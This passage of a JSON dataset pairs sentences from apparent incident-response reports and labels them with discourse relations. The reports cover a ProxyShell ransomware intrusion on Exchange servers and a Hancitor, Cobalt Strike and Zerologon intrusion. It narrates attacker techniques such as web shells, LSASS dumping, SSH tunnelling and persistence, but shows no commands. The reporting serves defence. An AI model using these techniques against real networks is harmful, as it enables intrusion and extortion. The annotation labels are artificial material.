        "S2": "They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk.",
        "S2": "This compressed file had a few files in it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This compressed file had a few files in it:",
        "S2": "RuntimeBroker",
        "relation": "MISC"
    },
    {
        "S1": "RuntimeBroker",
        "S2": "Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder.",
        "relation": "MISC"
    },
    {
        "S1": "Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder.",
        "S2": "A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.",
        "S2": "Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager.",
        "relation": "NEXT"
    },
    {
        "S1": "Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager.",
        "S2": "Thirty minutes later, the threat actor started using a domain administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "Thirty minutes later, the threat actor started using a domain administrator account.",
        "S2": "Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP.",
        "S2": "Targeted servers included backup systems and domain controllers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Targeted servers included backup systems and domain controllers.",
        "S2": "The threat actor also deployed the FRP package to these systems after gaining access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor also deployed the FRP package to these systems after gaining access.",
        "S2": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "S2": "Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.",
        "relation": "NEXT"
    },
    {
        "S1": "Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.",
        "S2": "To encrypt workstations, an open source utility called DiskCryptor was utilized.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To encrypt workstations, an open source utility called DiskCryptor was utilized.",
        "S2": "This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption.",
        "S2": "The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.",
        "S2": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "S2": "If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.",
        "S2": "The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.",
        "S2": "This time we will talk about ProxyShell, which revealed itself around August 2021.",
        "relation": "MISC"
    },
    {
        "S1": "This time we will talk about ProxyShell, which revealed itself around August 2021.",
        "S2": "Once again, the vulnerability affects Microsoft Exchange servers.",
        "relation": "MISC"
    },
    {
        "S1": "Once again, the vulnerability affects Microsoft Exchange servers.",
        "S2": "Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019.",
        "S2": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:",
        "S2": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "S2": "This last CVE allowed the creation of multiple web shells.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This last CVE allowed the creation of multiple web shells.",
        "S2": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "S2": "This was shortly followed by the cmdlet \u201cNew-ManagementRoleAssignment\u201d responsible for granting mailbox import/export privileges before running \u201cNew-MailboxExportRequest\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "This was shortly followed by the cmdlet \u201cNew-ManagementRoleAssignment\u201d responsible for granting mailbox import/export privileges before running \u201cNew-MailboxExportRequest\u201d.",
        "S2": "The cmdlet would export a Mailbox to a provided location with the .aspx extention.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The cmdlet would export a Mailbox to a provided location with the .aspx extention.",
        "S2": "While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.",
        "S2": "Below is an example of one of the IPs who successfully exploited the vulnerabilities:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is an example of one of the IPs who successfully exploited the vulnerabilities:",
        "S2": "Three web shells were spotted during our investigation:",
        "relation": "MISC"
    },
    {
        "S1": "Three web shells were spotted during our investigation:",
        "S2": "The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe.",
        "S2": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "S2": "Here\u2019s what the web shell looked like:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s what the web shell looked like:",
        "S2": "This is the web shell code for login.aspx:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is the web shell code for login.aspx:",
        "S2": "The other two web shells were dropped upon the successful exploitation of ProxyShell.",
        "relation": "NEXT"
    },
    {
        "S1": "The other two web shells were dropped upon the successful exploitation of ProxyShell.",
        "S2": "Running file command on these two web shells, show that they are actually PST files that contain web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Running file command on these two web shells, show that they are actually PST files that contain web shell:",
        "S2": "The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:",
        "relation": "LIST"
    },
    {
        "S1": "The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:",
        "S2": "The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:",
        "relation": "LIST"
    },
    {
        "S1": "The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:",
        "S2": "The threat actors executed a script named install-proxy.bat, containing the following lines of code:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors executed a script named install-proxy.bat, containing the following lines of code:",
        "S2": "The script creates two directories, then moves files into their respective directories.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script creates two directories, then moves files into their respective directories.",
        "S2": "It first stops and then deletes a task named CacheTask if it exists.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It first stops and then deletes a task named CacheTask if it exists.",
        "S2": "It then Creates a schedule task which will call an XML file which then executes CacheTask.bat",
        "relation": "NEXT"
    },
    {
        "S1": "It then Creates a schedule task which will call an XML file which then executes CacheTask.bat",
        "S2": "CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:",
        "relation": "ELABORATION"
    },
    {
        "S1": "CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:",
        "S2": "Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth\u2019s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:",
        "relation": "MISC"
    },
    {
        "S1": "Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth\u2019s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:",
        "S2": "The C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:",
        "S2": "The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.",
        "S2": "The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:",
        "S2": "In the command line above you can see several options being used:",
        "relation": "MISC"
    },
    {
        "S1": "In the command line above you can see several options being used:",
        "S2": "After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.",
        "relation": "NEXT"
    },
    {
        "S1": "After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.",
        "S2": "To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount.",
        "S2": "It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic.",
        "S2": "The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).",
        "S2": "To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:",
        "S2": "After activating the account, the threat actors set the password of this account to [email protected] and added it to Administrators and Remote Desktop Users groups.",
        "relation": "NEXT"
    },
    {
        "S1": "After activating the account, the threat actors set the password of this account to [email protected] and added it to Administrators and Remote Desktop Users groups.",
        "S2": "ProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges.",
        "relation": "MISC"
    },
    {
        "S1": "ProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges.",
        "S2": "Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials.",
        "S2": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "S2": "Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion.",
        "S2": "However, the threat actors performed masquerading with many of their tools:",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the threat actors performed masquerading with many of their tools:",
        "S2": "They created login.aspx web shell in the same folder as the legitimate OWA login page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They created login.aspx web shell in the same folder as the legitimate OWA login page.",
        "S2": "They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy",
        "relation": "LIST"
    },
    {
        "S1": "They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy",
        "S2": "They created the Scheduled Task with \u201c\\Microsoft\\Windows\\Maintenance\\CacheTask\u201d name to stay un-noticed",
        "relation": "LIST"
    },
    {
        "S1": "They created the Scheduled Task with \u201c\\Microsoft\\Windows\\Maintenance\\CacheTask\u201d name to stay un-noticed",
        "S2": "The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:",
        "S2": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "relation": "ELABORATION"
    },
    {
        "S1": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "S2": "As previously mentioned, we saw multiple cmdlets related to exchange:",
        "relation": "MISC"
    },
    {
        "S1": "As previously mentioned, we saw multiple cmdlets related to exchange:",
        "S2": "Using the dropped web shells, the threat actors performed the following commands:",
        "relation": "MISC"
    },
    {
        "S1": "Using the dropped web shells, the threat actors performed the following commands:",
        "S2": "The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:",
        "S2": "The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account.",
        "S2": "Below is an extract focusing on RDP activity from patient 0:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is an extract focusing on RDP activity from patient 0:",
        "S2": "The threat actors also appeared to use Impacket\u2019s wmiexec to perform lateral movement on one of the domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also appeared to use Impacket\u2019s wmiexec to perform lateral movement on one of the domain controllers.",
        "S2": "We do not have a clear explanation for that behavior.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We do not have a clear explanation for that behavior.",
        "S2": "However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.",
        "S2": "No data collection was observed in this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "No data collection was observed in this intrusion.",
        "S2": "The threat actors only collected the dumped LSASS using a zip archive:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors only collected the dumped LSASS using a zip archive:",
        "S2": "No Command and Control frameworks were used during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "No Command and Control frameworks were used during this intrusion.",
        "S2": "Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.",
        "S2": "Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:",
        "relation": "NEXT"
    },
    {
        "S1": "Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:",
        "S2": "Looking at this IP address on VirusTotal, we can observe that all \u201cCommunicating Files\u201d related to it trigger FRP AV Signatures or Yara rules:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Looking at this IP address on VirusTotal, we can observe that all \u201cCommunicating Files\u201d related to it trigger FRP AV Signatures or Yara rules:",
        "S2": "We can conclude that those threat actors are used to this protocol tunneling technique.",
        "relation": "MISC"
    },
    {
        "S1": "We can conclude that those threat actors are used to this protocol tunneling technique.",
        "S2": "Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.",
        "S2": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "relation": "NEXT"
    },
    {
        "S1": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "S2": "On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead.",
        "S2": "Both were executed via the threat actors after RDP login to each host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both were executed via the threat actors after RDP login to each host.",
        "S2": "On servers they copied over a file named setup.bat.",
        "relation": "MISC"
    },
    {
        "S1": "On servers they copied over a file named setup.bat.",
        "S2": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "relation": "NEXT"
    },
    {
        "S1": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "S2": "Below are the commands executed by the script:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below are the commands executed by the script:",
        "S2": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:",
        "relation": "NEXT"
    },
    {
        "S1": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:",
        "S2": "A binary called dcrypt.exe, was dropped on a backup server and immediately deleted.",
        "relation": "NEXT"
    },
    {
        "S1": "A binary called dcrypt.exe, was dropped on a backup server and immediately deleted.",
        "S2": "While this utility was not executed on any servers in the environment it was deployed to all the workstations.",
        "relation": "NEXT"
    },
    {
        "S1": "While this utility was not executed on any servers in the environment it was deployed to all the workstations.",
        "S2": "The executable used is the current release of the installer for the utility DiskCryptor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The executable used is the current release of the installer for the utility DiskCryptor.",
        "S2": "We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.",
        "S2": "Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.",
        "S2": "This executable, however, reminds you on install that it is \u201cbeta\u201d software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This executable, however, reminds you on install that it is \u201cbeta\u201d software.",
        "S2": "The setup process then works as most windows installers and requires a reboot of the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The setup process then works as most windows installers and requires a reboot of the system.",
        "S2": "During installation a kernel mode driver is added to support the encryption process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During installation a kernel mode driver is added to support the encryption process.",
        "S2": "After reboot, the program GUI allows you to configure the encryption options.",
        "relation": "NEXT"
    },
    {
        "S1": "After reboot, the program GUI allows you to configure the encryption options.",
        "S2": "After encryption completed, the systems were rebooted and left with the following screen: The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out.",
        "relation": "NEXT"
    },
    {
        "S1": "After encryption completed, the systems were rebooted and left with the following screen: The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out.",
        "S2": "The note pointed to Telegram and ProtonMail contacts",
        "relation": "ELABORATION"
    },
    {
        "S1": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "S2": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.",
        "relation": "NEXT"
    },
    {
        "S1": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.",
        "S2": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "S2": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "S2": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "S2": "They then checked access to remote systems by connecting to the C$ share.",
        "relation": "NEXT"
    },
    {
        "S1": "They then checked access to remote systems by connecting to the C$ share.",
        "S2": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "S2": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "relation": "NEXT"
    },
    {
        "S1": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "S2": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "relation": "NEXT"
    },
    {
        "S1": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "S2": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "relation": "NEXT"
    },
    {
        "S1": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "S2": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "S2": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "relation": "NEXT"
    },
    {
        "S1": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "S2": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "S2": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "S2": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "S2": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "S2": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "relation": "NEXT"
    },
    {
        "S1": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "S2": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.",
        "S2": "The document was delivered via an email that included a link to Google\u2019s Feed Proxy service which was hosting a malicious document as shared by @James_inthe_box .",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document was delivered via an email that included a link to Google\u2019s Feed Proxy service which was hosting a malicious document as shared by @James_inthe_box .",
        "S2": "Thanks for sharing James!",
        "relation": "MISC"
    },
    {
        "S1": "Thanks for sharing James!",
        "S2": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.",
        "S2": "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.",
        "relation": "MISC"
    },
    {
        "S1": "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.",
        "S2": "The Cobalt Strike servers in this case were added to the Threat Feed on 5/16 and 7/15 .",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike servers in this case were added to the Threat Feed on 5/16 and 7/15 .",
        "S2": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
        "S2": "More information on this service and others can be found here .",
        "relation": "ELABORATION"
    },
    {
        "S1": "More information on this service and others can be found here .",
        "S2": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "S2": "Similar to a previous case , the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "relation": "NEXT"
    },
    {
        "S1": "Similar to a previous case , the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "S2": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "S2": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "S2": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "S2": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "relation": "NEXT"
    },
    {
        "S1": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "S2": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "S2": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "S2": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "relation": "NEXT"
    },
    {
        "S1": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "S2": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "relation": "NEXT"
    },
    {
        "S1": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "S2": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "relation": "NEXT"
    },
    {
        "S1": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "S2": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "S2": "They then checked access to remote systems by connecting to the C$ share.",
        "relation": "NEXT"
    },
    {
        "S1": "They then checked access to remote systems by connecting to the C$ share.",
        "S2": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "relation": "MISC"
    },
    {
        "S1": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "S2": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "S2": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "relation": "MISC"
    },
    {
